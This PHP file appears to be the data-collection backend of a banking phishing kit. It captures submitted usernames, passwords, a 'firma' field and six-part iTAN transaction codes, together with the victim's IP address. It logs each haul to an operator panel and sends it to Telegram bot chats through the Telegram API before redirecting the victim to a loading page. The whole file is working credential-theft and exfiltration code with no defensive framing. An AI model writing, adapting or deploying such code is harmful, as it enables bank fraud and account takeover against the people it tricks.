<?php
require "../main.php";

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('web/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['username'])){
	
	$login = post("username");
	$pass = post("password");

	$telegram_content = urlencode("
	/------ !NG L0G!N ------/ $ip
	+ Log : $login
	+ pass : $pass
	/------ END LOGIN INFOS ------/
    + C-PANEL : $panel
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ LOGIN [ $login | $pass ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
			$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
			sendBot($url);
		}
		 header("location: loading.php?p=LOGIN");
 
}

if(isset($_POST['firma'])){
	
	$firma = post("firma");
	$telegram_content = urlencode("
	/------ !NG F!RMA ------/ $ip
	+ Firma : $firma
	/------ 3ND L0G!N !NF0S ------/
    + C-PANEL : $panel
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ Firma [ $firma ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
			$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
			sendBot($url);
		}
		 header("location: loading.php?p=firma");
 
}

if(isset($_POST['itan1'])){
	
	$itan1 = post("itan1");
	$itan2 = post("itan2");
	$itan3 = post("itan3");
	$itan4 = post("itan4");
	$itan5 = post("itan5");
	$itan6 = post("itan6");
	$telegram_content = urlencode("
	/------ !NG !TAN ------/ $ip
	+ ITAN-C0d3 : $itan1-$itan2-$itan3-$itan4-$itan5-$itan6
	/------ 3ND !TAN !NF0Z ------/
    + C-PANEL : $panel
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ itan [ $itan1 | $itan2 | $itan3 | $itan4  | $itan5  | $itan6 ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
			$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
			sendBot($url);
		}
		 header("location: loading.php?p=itan");
 
}


?>
